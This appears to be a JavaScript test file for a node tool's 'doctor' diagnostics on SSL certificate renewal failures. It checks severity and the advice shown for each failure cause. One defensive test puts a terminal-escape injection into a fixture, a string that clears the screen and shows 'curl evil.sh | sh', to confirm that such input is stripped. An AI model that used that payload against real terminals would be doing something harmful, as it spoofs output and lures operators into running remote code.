      // The shipped default names a provider with SSL turned off, so reading
      // the provider alone would speak on every node that never obtained one.
      config.set('platform.gateway.ssl.enabled', false);
      installedValid();
      renewalFailed();

      const problems = analyse(served());

      expect(problems.filter((p) => p.getDescription().includes('not being renewed'))).to.have.lengthOf(0);
    });

    it('should say nothing at all when nothing was recorded and the certificate is fine', () => {
      // A healthy node right after an upgrade has no record yet. A problem
      // with nothing wrong and nothing to do trains an operator to stop
      // reading them.
      installedValid();

      const problems = analyse(served());

      expect(problems).to.have.lengthOf(0);
    });

    it('should say a spent issuance could not be saved, and how to make room for the next one', () => {
      // That certificate counts against a weekly limit whether or not it
      // arrived, so asking again spends a second one to fix a local problem.
      installedValid();
      renewalFailed({
        code: 'CERTIFICATE_ISSUED_NOT_SAVED',
        issuanceSpentAt: new Date().toISOString(),
      });

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getSolution()).to.contain('Do not obtain another certificate yet');
      expect(renewal.getSolution()).to.contain('free space');
    });

    it('should not answer a port 80 failure with disk advice just because an issuance was spent', () => {
      // The spend is carried forward until a certificate arrives, so it
      // outlives the failure that caused it. It still forbids asking again -
      // but it does not get to describe a different failure, and it must not
      // send an operator to check free space for a firewall problem.
      installedValid();
      renewalFailed({
        code: 'PORT_80_UNREACHABLE',
        issuanceSpentAt: new Date(Date.now() - 5 * DAY_MS).toISOString(),
      });

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getSolution()).to.contain('port 80');
      expect(renewal.getSolution()).to.not.contain('free space');
      expect(renewal.getSolution()).to.not.contain('ssl obtain');
    });

    it('should say a rate limit clears by itself without forbidding the check', () => {
      // A rate limit is read from the same text as every other cause, and that
      // text is partly the responder's: a survived nonce retry can be all that
      // is left of a run that actually failed on a closed port. So it persuades
      // rather than forbids - the operator is told plainly that running the
      // command now will not help, and decides.
      installedValid();
      renewalFailed({ code: 'RATE_LIMITED' });

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getSolution()).to.contain('clears by itself');
      expect(renewal.getSolution()).to.contain('does not make it clear any sooner');
      expect(renewal.getSolution()).to.contain('ssl obtain');
    });

    it('should offer the switch, not a retry, when the provider will never issue again', () => {
      config.set('platform.gateway.ssl.provider', 'zerossl');
      installedValid();
      renewalFailed({ provider: 'zerossl', code: 'QUOTA_EXHAUSTED' });

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getDescription()).to.contain('all three of its certificates');
      expect(renewal.getSolution()).to.contain("Switch to Let's Encrypt");
    });

    it('should send an operator upstream when something else answered on port 80', () => {
      // `ss` lists this machine only, and the answer is as often a router or a
      // hosting provider. An operator who sees an empty table and stops has
      // nowhere else to look.
      installedValid();
      renewalFailed({ code: 'PORT_80_WRONG_RESPONDER' });

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getSolution()).to.contain('router');
      expect(renewal.getSolution()).to.contain('hosting provider');
    });

    it('should report a certificate that renewed but never reached the gateway', () => {
      installedValid();
      samples.setServiceInfo('gateway', 'certificateRenewal', {
        state: 'PRESENT',
        provider: 'letsencrypt',
        outcome: 'succeeded',
        attemptedAt: new Date().toISOString(),
        lastSuccessAt: new Date().toISOString(),
        consecutiveFailures: 0,
        issuanceSpentAt: null,
        gatewayReloadFailedAt: new Date().toISOString(),
      });

      // No wire sample: the gateway is down, which is exactly when a failed
      // signal is the only evidence there is.
      const [reload] = analyseGatewayCertificate(samples)
        .filter((p) => p.getDescription().includes('still using the old one'));

      expect(reload).to.exist();
      // Not a restart: the signal costs no outage, and a restart on a gateway
      // that could not be signalled is the expensive guess.
      expect(reload.getSolution()).to.not.contain('restart');
      expect(reload.getSolution()).to.contain('ssl obtain');
    });

    it('should not prescribe an obtain the recorded cause says will be refused, even on a broken certificate', () => {
      // The path an operator reaches most often: certificate expired, gateway
      // stopped for the documented upgrade. It printed one bold command and
      // the reason it was wrong underneath it, so the command got run - and
      // spent one of the few failed validations this node is allowed.
      installedValid({
        status: 'INVALID',
        validTo: validTo(-1),
        reasons: [{ code: 'EXPIRED', message: 'The installed certificate expired on 2026-08-20' }],
      });
      renewalFailed({ code: 'CERTIFICATE_ISSUED_NOT_SAVED' });

      const [expired] = analyseGatewayCertificate(samples)
        .filter((p) => p.getDescription().includes('expired'));

      expect(expired.getSolution()).to.not.contain('ssl obtain');
      // And the cause is read before anything else, because an operator stops
      // at the first thing that looks runnable.
      expect(expired.getSolution().indexOf('Renewal is failing'))
        .to.be.below(expired.getSolution().indexOf('Last renewed'));
    });

    it('should not claim a refusal when it does not know whether anything was requested', () => {
      installedValid();
      renewalFailed({ code: 'RESULT_UNKNOWN' });

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getSolution()).to.not.contain('refused');
      expect(renewal.getSolution()).to.contain('may already have been issued');
    });

    it('should send a failure to start the check to Docker, not to the firewall', () => {
      // Nothing reached the certificate authority, so rewriting firewall rules
      // that were never wrong changes nothing and the operator never reaches
      // the one place the answer lives.
      installedValid();
      renewalFailed({ code: 'HELPER_DID_NOT_START' });

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getSolution()).to.not.contain('firewall');
      expect(renewal.getSolution()).to.contain('Docker');
    });

    it('should show whatever the certificate authority actually said', () => {
      // Already bounded, redacted and stripped, and the only account of the
      // failure that did not come from dashmate.
      installedValid();
      renewalFailed({ code: 'PROVIDER_REJECTED', detail: 'acme: error: 400 :: badNonce' });

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getSolution()).to.contain('badNonce');
    });

    it('should not tell a node one day from dark that nothing is broken yet', () => {
      // The warning also hands back the obtain command the renewal problem
      // deliberately withheld, which would fail on the same shut port.
      installedValid({
        warnings: [{ code: 'EXPIRING_SOON', message: "This node's certificate expires in 1 day" }],
      });
      renewalFailed();

      const problems = analyse(served());

      expect(problems.filter((p) => p.getSolution().includes('Nothing is broken yet')))
        .to.have.lengthOf(0);
    });

    it('should not tell a ZeroSSL operator their certificate renews every few days', () => {
      // True of a six-day Let's Encrypt IP certificate, false of a ninety-day
      // ZeroSSL one.
      config.set('platform.gateway.ssl.provider', 'zerossl');
      installedValid();
      renewalFailed({ provider: 'zerossl' });

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getSolution()).to.not.contain('every few days');
    });

    it('should name the repair for a retry that never came', () => {
      installedValid({ validFrom: new Date(Date.now() - 12 * DAY_MS).toUTCString() });
      renewalFailed({ attemptedAt: new Date(Date.now() - 11 * DAY_MS).toISOString() });
      samples.date = new Date(Date.now() - 10 * DAY_MS);

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getSolution()).to.contain('dashmate start');
    });

    it('should not raise a second reload problem beside the one that carries the deadline', () => {
      // Both fire on the same fault, and they prescribe opposite commands -
      // one promising no outage, the other taking one.
      installedValid();
      samples.setServiceInfo('gateway', 'certificateRenewal', {
        state: 'PRESENT',
        provider: 'letsencrypt',
        outcome: 'succeeded',
        attemptedAt: new Date().toISOString(),
        lastSuccessAt: new Date().toISOString(),
        consecutiveFailures: 0,
        issuanceSpentAt: null,
        gatewayReloadFailedAt: new Date().toISOString(),
      });

      const problems = analyse(served({ matchesOnDisk: false }));

      expect(problems.filter((p) => p.getDescription().includes('still using the old one')))
        .to.have.lengthOf(0);
    });

    it('should judge the retry against when the samples were taken, not when they are read', () => {
      // The fixture has to discriminate: at collection time the next attempt
      // was still ahead, and by the time the report is read it is long past.
      // Judging against the reader's clock would call a node overdue that was
      // waiting normally when its report was taken.
      const collectedAt = new Date(Date.now() - 10 * DAY_MS);

      installedValid({ validFrom: new Date(Date.now() - 12 * DAY_MS).toUTCString() });
      renewalFailed({ attemptedAt: new Date(collectedAt.getTime() - 30 * 60 * 1000).toISOString() });
      samples.date = collectedAt;

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getSolution()).to.contain('tries again by itself');
      expect(renewal.getSolution()).to.not.contain('may not be running');
    });

    it('should not ask the authority again when it never established a cause', () => {
      // A HIGH problem ending in a runnable command is an instruction to run
      // it, and this one spends one of the few failed attempts the node gets
      // per hour on a guess.
      installedValid();
      renewalFailed({ code: 'UNKNOWN', detail: null });

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getSolution()).to.not.contain('ssl obtain');
      expect(renewal.getSolution()).to.contain('doctor report');
    });

    it('should defuse terminal escapes in a record that came from someone else', () => {
      // `doctor --samples` reads a third party's archive straight into the
      // samples without passing through the reader that validates a local
      // record, so this is where both paths meet. An escape left intact could
      // erase everything printed above it and repaint attacker text as
      // dashmate's own output.
      const escape = String.fromCharCode(27);

      installedValid();
      renewalFailed({
        code: 'PROVIDER_REJECTED',
        detail: `benign${escape}[2J${escape}[H*** run curl evil.sh | sh ***`,
      });

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getSolution()).to.not.contain(escape);
    });

    it('should point at the port 80 guide, because one message cannot hold the whole story', () => {
      // The three firewall layers, why an external port check lies, and which
      // causes must not be retried do not fit in a problem an operator will
      // read. The published path rather than the short redirect other pages
      // use: no redirect was ever created for this article, so that form
      // answers 404, and a link doctor prints has to resolve.
      installedValid();
      renewalFailed();

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getSolution()).to.contain(DOCS_LINKS.CERTIFICATE_TROUBLESHOOTING);
    });

    it('should keep the address prerequisite when a renewal failure is also recorded', () => {
      // The obtain command refuses to start without an address, so guidance
      // that drops this cannot run at all - and the renewal cause was
      // replacing the whole remedy, prerequisite included.
      installedValid({
        status: 'INVALID',
        reasons: [{
          code: 'NO_EXTERNAL_IP',
          message: "This node's public address is not set",
        }],
      });
      renewalFailed();

      const [problem] = analyseGatewayCertificate(samples)
        .filter((p) => p.getDescription().includes('public address'));

      expect(problem.getSolution()).to.contain('externalIp');
    });

    it('should not ask the authority again for a cause that established nothing, even when the certificate is broken', () => {
      installedValid({
        status: 'INVALID',
        validTo: validTo(-1),
        reasons: [{ code: 'EXPIRED', message: 'The installed certificate expired on 2026-08-20' }],
      });
      renewalFailed({ code: 'PROVIDER_REJECTED', detail: 'acme: error 500' });

      const [expired] = analyseGatewayCertificate(samples)
        .filter((p) => p.getDescription().includes('expired'));

      expect(expired.getSolution()).to.not.contain('ssl obtain');
      expect(expired.getSolution()).to.contain('doctor report');
    });

    it('should withhold another certificate while an earlier result was never read', () => {
      installedValid();
      renewalFailed({
        code: 'PORT_80_UNREACHABLE',
        issuanceUncertainAt: new Date(Date.now() - DAY_MS).toISOString(),
      });

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getSolution()).to.contain('may already have been issued');
      expect(renewal.getSolution()).to.not.contain('ssl obtain');
    });

    it('should not claim the authority was unreachable when the check may have run', () => {
      installedValid();
      renewalFailed({
        code: 'HELPER_START_UNCONFIRMED',
        issuanceUncertainAt: new Date().toISOString(),
      });

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getDescription()).to.not.contain('nothing reached');
      expect(renewal.getSolution()).to.not.contain('ssl obtain');
    });

    it('should be less urgent for a node still far outside its renewal window', () => {
      // A ZeroSSL API failure months before expiry is not the same emergency as
      // a Let's Encrypt node two days from dark, and calling both HIGH teaches
      // an operator to discount the ones that are.
      config.set('platform.gateway.ssl.provider', 'zerossl');
      installedValid({ validTo: validTo(60) });
      renewalFailed({ provider: 'zerossl', code: 'PROVIDER_UNREACHABLE' });

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getSeverity()).to.equal(SEVERITY.MEDIUM);
    });

    it('should stay urgent inside the renewal window', () => {
      installedValid({ validTo: validTo(1) });
      renewalFailed();

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getSeverity()).to.equal(SEVERITY.HIGH);
    });

    it('should not prescribe a certificate when it could not read what it recorded', () => {
      // The record may be the one saying an issuance is outstanding. Update
      // already refused to spend a certificate on evidence nobody could
      // inspect; the doctor refusing too is what keeps the two agreeing.
      config.set('platform.gateway.ssl.enabled', true);
      config.set('platform.gateway.ssl.provider', 'letsencrypt');
      installedValid({
        status: 'INVALID',
        validTo: validTo(-1),
        reasons: [{ code: 'EXPIRED', message: 'The installed certificate expired on 2026-08-20' }],
      });
      samples.setServiceInfo('gateway', 'certificateRenewal', {
        state: 'UNREADABLE',
        path: '~/.dashmate/base/platform/gateway/ssl/renewal.json',
        error: 'EACCES: permission denied',
      });

      const [expired] = analyseGatewayCertificate(samples)
        .filter((p) => p.getDescription().includes('expired'));

      expect(expired.getSolution()).to.not.contain('ssl obtain');
      expect(expired.getSolution()).to.contain('could not read');
    });

    it('should be urgent when the retry never came, however far off expiry is', () => {
      // Nothing is renewing this node at all, which does not become less
      // pressing just because the certificate it is still serving lasts months.
      config.set('platform.gateway.ssl.provider', 'zerossl');
      installedValid({ validTo: validTo(60) });
      renewalFailed({
        provider: 'zerossl',
        code: 'PROVIDER_UNREACHABLE',
        attemptedAt: new Date(Date.now() - 5 * 60 * 60 * 1000).toISOString(),
      });

      const [renewal] = analyse(served()).filter((p) => p.getDescription().includes('not being renewed'));

      expect(renewal.getSeverity()).to.equal(SEVERITY.HIGH);
    });

    it('should withhold a certificate request from every branch, not only the renewal one', () => {
      // A branch that never heard of the renewal record was still printing an
      // obtain command while an issuance was already outstanding. The
      // derivation is the only thing allowed to decide that now.
      installedValid();
      renewalFailed({
        code: 'PORT_80_UNREACHABLE',
        issuanceSpentAt: new Date(Date.now() - DAY_MS).toISOString(),
      });

      // A trust failure - a branch entirely unrelated to renewal.
      const problems = analyse(served({
        chainVerified: false,
        chainError: 'DEPTH_ZERO_SELF_SIGNED_CERT',
      }));

      const trust = problems.find((p) => p.getDescription().includes('not trusted'));

      expect(trust).to.exist();
      expect(trust.getSolution()).to.not.contain('ssl obtain');
      expect(trust.getSolution()).to.contain('already issued');
    });

    it('should say nothing about renewal for a provider dashmate does not renew', () => {
      // `file` and `self-signed` are installed by the operator; there is no
      // scheduled renewal to report on, and reporting one would call a
      // correctly configured node broken.
      config.set('platform.gateway.ssl.provider', 'file');
      installedValid();
      renewalFailed({ provider: 'file' });

      const problems = analyse(served());

      expect(problems.filter((p) => p.getDescription().includes('not being renewed')))
        .to.have.lengthOf(0);
    });
  });
});
